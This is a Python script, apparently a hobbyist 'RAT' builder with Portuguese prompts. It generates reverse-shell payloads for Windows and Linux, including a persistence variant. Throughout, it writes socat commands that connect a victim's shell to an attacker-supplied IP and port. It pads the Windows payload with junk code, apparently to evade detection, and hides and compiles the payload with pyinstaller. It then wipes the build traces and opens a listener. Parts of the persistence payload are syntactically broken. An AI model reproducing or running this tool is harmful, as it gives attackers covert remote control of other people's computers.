import os
import sys
import subprocess
from time import sleep
import random


# cores 

vermelho = '\033[31m'
verde = '\033[32m'
azul = '\033[34m'

# tempo

tempo = [7,14,20]

# banner

def banner():
    os.system('cls')
    print(verde + """
    

        ..######.....###....########..#######..##....##....########.....###....########
        .##....##...##.##........##..##.....##.###...##....##.....##...##.##......##...
        .##........##...##......##...##.....##.####..##....##.....##..##...##.....##...
        ..######..##.....##....##....##.....##.##.##.##....########..##.....##....##...
        .......##.#########...##.....##.....##.##..####....##...##...#########....##...
        .##....##.##.....##..##......##.....##.##...###....##....##..##.....##....##...
        ..######..##.....##.########..#######..##....##....##.....##.##.....##....##...

                                

                https://instagram.com/fellipMG    https://instagram.com/sed.sec

                https://github.com/fellipmelo     https://linkedin.com/in/fellipmelo

     *Para sair feche a janela*                                                      
    """)
    
# ip e porta
banner()

escuta = input(azul + """~"""+ verde +"""Somente ouvir ? S/N: """)

if escuta == 's':
        ip = input(azul + """~"""+ verde +"""$IP:""")
        print('')
        porta = input(azul + "~"+ verde +"$PORTA:")
        os.system('cls')

        banner()

        sleep(random.choice(tempo))

        print(verde+"""         Aguardando conexão              """)

        os.system('.\sys.exe - TCP-LISTEN:{0}'.format(porta))

elif escuta == 'n':
    n = input(azul + """~"""+ verde +"""Vai utilizar o Ngrok ? S/N: """)
    print('')
    ip = input(azul + """~"""+ verde +"""$IP:""")
    print('')
    porta = input(azul + "~"+ verde +"$PORTA:")
    print('')
    #nome do payload

    name = str(input(azul + "~"+ verde +"$nome PAYLOAD:"))
    print('')
    pass
    # builders
else:
    SystemExit
linux = """import os; os.system("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s")"""%(ip,porta)

linux_persis = """import os; chmod +777 %s.exe; os.system cp %s.exe /etc/rc.d/; os.system("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s")"""%(name,name,ip,porta)

windows = """import os; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; a = 1; a = 2; d = 2; w = 1; os.system(".\win.exe exec:'cmd',pty,stderr,setsid,sigint,sane tcp:%s:%s")"""%(ip,porta)



print( vermelho + """

    1) Reverse Shell Windows
    2) Reverse Shell Linux
    3) Reverse Shell Linux Persistência

""")


arch = int(input(azul + "~"+ verde +"$:"))

def pay():
    if arch == 1:
        out = open("{0}.py".format(name), 'w')
        os.system('attrib +h {0}.py'.format(name))
        out.write(windows)
        out.close()
        subprocess.call(['powershell', 'pyinstaller --distpath saída -F {0}.py'.format(name)])
        os.system('cls')

    elif arch == 2:
        out = open("{0}.py".format(name), 'w')
        os.system('attrib +h {0}.py'.format(name))
        out.write(linux)
        out.close()
        subprocess.call(['powershell', 'pyinstaller --distpath saída -F {0}.py'.format(name)])
        os.system('cls')
        
    elif arch == 3:
        out = open("{0}.py".format(name), 'w')
        os.system('attrib +h {0}.py'.format(name))
        out.write(linux_persis)
        out.close()
        subprocess.call(['powershell', 'pyinstaller --distpath saída -F {0}.py'.format(name)])
        os.system('cls')

    else:
        print("Sem suporte")

def limpar():
    subprocess.call(['powershell', 'rm -r build'])
    subprocess.call(['powershell', 'rm -r __pycache__'])
    subprocess.call(['powershell', 'rm {0}.spec'.format(name)])
    os.system('attrib -h {0}.py'.format(name))
    subprocess.call(['powershell', 'rm {0}.py'.format(name)])

def connect():
    #print(verde+"""         Aguardando conexão              """)

    if n == "s":
        porta_ngrok = input(azul + "~"+ verde +"$PORTA LOCAL:")
        os.system('cls')
        banner()
        sleep(random.choice(tempo))

        print(verde+"""         Aguardando conexão              """)

        os.system('.\sys.exe - TCP-LISTEN:{0}'.format(porta_ngrok))
    elif n =="n":
        os.system('cls')

        banner()

        sleep(random.choice(tempo))

        print(verde+"""         Aguardando conexão              """)

        os.system('.\sys.exe - TCP-LISTEN:{0}'.format(porta))
    else:
        print("""   Talvez você digitou errado se usaria ou não o ngrok, digite 's' para sim e 'n' caso contrário. """)
try:    
    
    pay()
    os.system('cls')
    limpar()
    os.system('cls')
    connect()

except (KeyboardInterrupt):
    limpar()
    os.system('cls')
    print("Erro, por favor reporte")
    sleep(20)
   
    

#except (KeyboardInterrupt):
    #os.system('del /Q *')
    #print(verde + "Saindo")
    #limpar()


